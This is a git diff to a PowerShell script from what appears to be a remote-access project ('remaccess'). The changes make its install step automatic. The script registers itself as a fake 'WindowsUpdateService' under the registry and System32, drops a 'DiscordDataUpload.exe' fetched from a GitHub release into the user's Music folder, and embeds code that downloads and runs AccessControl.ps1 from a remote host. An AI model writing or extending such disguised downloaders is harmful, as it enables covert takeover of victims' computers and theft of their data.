@@ -1,15 +1,21 @@
 $regPath = "HKLM:\Software\WindowsUpdateService"
 $userNames = Get-WmiObject -Class Win32_UserProfile | ForEach-Object { $_.LocalPath.Split('\')[-1] }
-$code = Read-Host "Enter the code"
-$name = Read-Host "Type in the Name of the PC"
-$exepath =  Join-Path $env:USERPROFILE\Contacts "DiscordDataUpload.exe"
+$exepath =  Join-Path $env:USERPROFILE "Music\DiscordDataUpload.exe"
 $shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
 $messageboturl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
 if (-not (Test-Path $regPath)) {
     New-Item -Path $regPath -Force
 }
-Set-ItemProperty -Path $regPath -Name "Code" -Value $code
-Set-ItemProperty -Path $regPath -Name "Data" -Value active
+$existingCode = (Get-ItemProperty -Path $regPath).Code
+if ($existingCode -match '^(6|0)\d{5}$') {
+    $code = $existingCode
+} else {
+    $code = "6" + (Get-Random -Minimum 10000 -Maximum 99999)
+    Set-ItemProperty -Path $regPath -Name "Code" -Value $code
+}
+if (-not (Test-Path "$regPath\Data") -or (Get-ItemProperty -Path "$regPath\Data").Data -ne "active") {
+    Set-ItemProperty -Path $regPath -Name "Data" -Value "active"
+}
 #Install WindowsUpdateService
 $scriptContent = @'
 $url = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/AccessControl.ps1"
@@ -132,4 +138,3 @@ foreach ($file in $ps1Files) {
         Write-Host "File $file does not exist."
     }
 }
-
